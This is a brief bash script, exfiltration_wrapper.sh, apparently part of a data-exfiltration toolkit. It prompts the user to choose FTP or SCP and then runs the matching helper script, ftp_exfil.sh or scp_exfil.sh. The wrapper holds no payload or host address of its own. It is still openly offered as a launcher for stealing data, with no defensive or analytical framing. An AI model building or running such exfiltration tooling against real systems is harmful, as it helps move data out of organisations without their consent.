#!/bin/bash
# exfiltration_wrapper.sh - A wrapper to call a chosen exfiltration method.
echo "Choose exfiltration method:"
echo "1) FTP"
echo "2) SCP"
read -p "Enter choice [1-2]: " CHOICE
if [ "$CHOICE" -eq 1 ]; then
    ./ftp_exfil.sh "$@"
elif [ "$CHOICE" -eq 2 ]; then
    ./scp_exfil.sh "$@"
else
    echo "Invalid choice."
fi
